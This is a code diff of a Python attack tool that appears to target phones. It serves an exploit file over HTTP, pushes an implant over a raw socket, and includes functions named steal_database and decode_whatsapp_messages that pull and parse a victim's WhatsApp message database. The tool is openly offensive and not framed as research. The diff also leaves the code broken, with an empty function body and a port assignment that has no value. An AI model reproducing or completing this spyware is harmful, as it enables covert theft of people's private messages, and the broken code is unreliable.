@@ -4,18 +4,20 @@ from Crypto.Cipher import AES
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
-def listen_for_phone_and_send_exploit_file(ip_address):
-    server_address = (ip_address, 12345)
-    print("Localhost waiting on port 12345 for client to connect")
+def listen_for_phone_and_send_exploit_file():
+    server_address = ('', 80)
+    print("Localhost waiting on 80 for client to connect")
     s = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
     s.handle_request()
-# 
-def send_implant(ip_address):
+
+def prepare_implant():
+
+def send_implant():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    port = 6969               
-    s.bind((ip_address, port))
+    port =              
+    s.bind(('', port))
     s.listen(1)        
-    print("Listening on port 6969 of " + ip_address)        
+    print("Listening on port 6969")        
     count = 0 
     while count < 1:
         conn, addr = s.accept()
@@ -48,6 +50,7 @@ def steal_database():
         count += 1
         conn.close() 
         print("Connection closed")
+        s.close()
 
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
@@ -77,9 +80,9 @@ def connect_to_db(filepath):
 
 if __name__ == "__main__":
     # host = 'localhost'
-    # listen_for_phone_and_send_exploit_file(host)
+    listen_for_phone_and_send_exploit_file()
     # send_implant(host)
-    steal_database()
+    # steal_database()
     # decode_whatsapp_messages()
  
    
